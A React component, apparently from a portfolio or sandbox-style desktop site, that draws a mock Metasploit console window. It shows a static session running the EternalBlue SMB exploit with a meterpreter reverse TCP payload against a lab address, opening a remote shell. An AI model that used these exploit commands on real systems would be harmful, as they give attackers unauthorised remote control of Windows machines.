'use client'

import Window from '../Window'
import { MetasploitIcon } from '../Icons'
import { getWindowTitles } from '../windowTitles'

const BANNER = `      =[ metasploit v6.4.5-dev                          ]
+ -- --=[ 2381 exploits - 1244 auxiliary - 421 post       ]
+ -- --=[ 1389 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/`

const SESSION = [
  'msf6 > use exploit/windows/smb/ms17_010_eternalblue',
  '[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp',
  'msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.101',
  'RHOSTS => 192.168.56.101',
  'msf6 exploit(ms17_010_eternalblue) > check',
  '[+] 192.168.56.101:445 - The target is vulnerable.',
  'msf6 exploit(ms17_010_eternalblue) > set LHOST tun0',
  'LHOST => 10.10.14.21',
  'msf6 exploit(ms17_010_eternalblue) > exploit',
  '[*] Started reverse TCP handler on 10.10.14.21:4444',
  '[*] 192.168.56.101:445 - Connecting to target for exploitation.',
  '[+] 192.168.56.101:445 - Exploit successful, sending payload.',
  '[*] Sending stage (203846 bytes) to 192.168.56.101',
  '[*] Meterpreter session 1 opened',
]

export default function MetasploitWindow() {
  return (
    <Window
      id="metasploit"
      title={getWindowTitles('metasploit').full}
      icon={<MetasploitIcon size={14} />}
      initialX={290}
      initialY={140}
      width={680}
      height={440}
      scrollable
    >
      <div
        className="p-3 h-full"
        style={{
          background: '#0a0a0a',
          color: '#e8e8e8',
          fontFamily: 'Consolas, "JetBrains Mono", monospace',
          fontSize: '12px',
          lineHeight: 1.4,
        }}
      >
        <pre style={{ color: '#d83a2a', margin: 0 }}>{BANNER}</pre>
        <div style={{ marginTop: 12 }}>
          {SESSION.map((line, i) => {
            const color = line.startsWith('[+]')
              ? '#00ff88'
              : line.startsWith('[*]')
                ? '#1c5fd6'
                : line.startsWith('[!]')
                  ? '#f59e0b'
                  : '#e8e8e8'
            return (
              <div key={i} style={{ color, whiteSpace: 'pre' }}>
                {line}
              </div>
            )
          })}
          <div style={{ color: '#d83a2a', marginTop: 4 }}>
            meterpreter &gt; <span className="cmd-caret">_</span>
          </div>
        </div>
        <div
          style={{
            marginTop: 14,
            padding: '6px 8px',
            background: 'rgba(216,58,42,0.12)',
            border: '1px solid rgba(216,58,42,0.45)',
            color: '#ff8a78',
            fontSize: 11,
          }}
        >
          ⚠ Use only on assets you own or have explicit written authorization to
          test. This is a sandbox playground.
        </div>
      </div>
    </Window>
  )
}
